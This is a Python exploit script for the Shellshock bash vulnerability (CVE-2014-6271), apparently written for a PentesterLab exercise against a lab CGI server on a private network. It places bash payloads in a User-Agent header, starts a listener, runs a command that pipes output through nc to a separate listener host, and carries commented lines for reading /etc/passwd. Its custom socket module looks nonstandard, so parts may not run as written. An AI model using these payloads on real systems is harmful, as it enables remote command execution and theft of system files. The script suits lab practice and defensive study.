#import http.client
#Reference: https://pentesterlab.com/exercises/cve-2014-6271/course
import requests
import time
import sockets
from thread_decorator import run_as_thread

EXPLOIT1='() { :;};%s'
EXPLOIT2='() { _; } >_[$($())] { %s; }'

TIMEOUT=10
protocol=None

@run_as_thread
def shellshock_listener(HOST_ADDRESS, DATA_PORT):
    data_sock = sockets.LocalSocket()
    data_sock.bind(HOST_ADDRESS, DATA_PORT).join()
    print("Listening!")
    #while True:
    #	msg = data_sock.recv(5).decode("ascii")
    #	print(msg)




#def request(target_host, path, headers):
    # if protocol == 'http':
    #     conn = http.client.HTTPConnection(target_host, timeout=TIMEOUT)
    # elif protocol == 'https':
    #     conn = http.client.HTTPSConnection(target_host, timeout=TIMEOUT)
    # elif target_host.endswith('443'):   #https for 443,9443,...
    #     conn = http.client.HTTPSConnection(target_host, timeout=TIMEOUT)
    # else:
    #     conn = http.client.HTTPConnection(target_host, timeout=TIMEOUT)
    #headers=headers
    
    
def exploit(URL, command, timeout=None):
    # print >> sys.stderr, "Connecting to %s - %s" %(target_host, cgi_path)

    shellcode=EXPLOIT1 % command

    headers = {"User-Agent": shellcode}
    start = time.time()
    #conn.request("GET", path, headers=headers)
    #res = conn.getresponse()
    res = requests.get(URL, headers=headers, timeout=timeout)
    print(res)
    print(res.status_code)
    print(res.headers)
    print(res.text)
    print(res.raw.read())


    end = time.time()
    delay = end - start
    #print(res.text)
    # print >> sys.stderr, "%s:\t[%s]\t%s %s\t%s" %(target_host, command, res.status, res.reason, delay) 
    # conn.close()
    #return (res.status, res.reason, delay, res)


#exploit('http://192.168.1.116/cgi-bin/status/status.cgi', "/bin/ping 192.168.1.89")


shellshock_listener("192.168.1.89", 9999)

exploit('http://192.168.1.116/cgi-bin/status/status.cgi', 'echo "VULNERABLE" | /usr/bin/nc 192.168.1.89 9999')



#echo \$(</etc/passwd)
#exploit('http://192.168.1.116/cgi-bin/status/status.cgi', "echo \$(</etc/passwd)")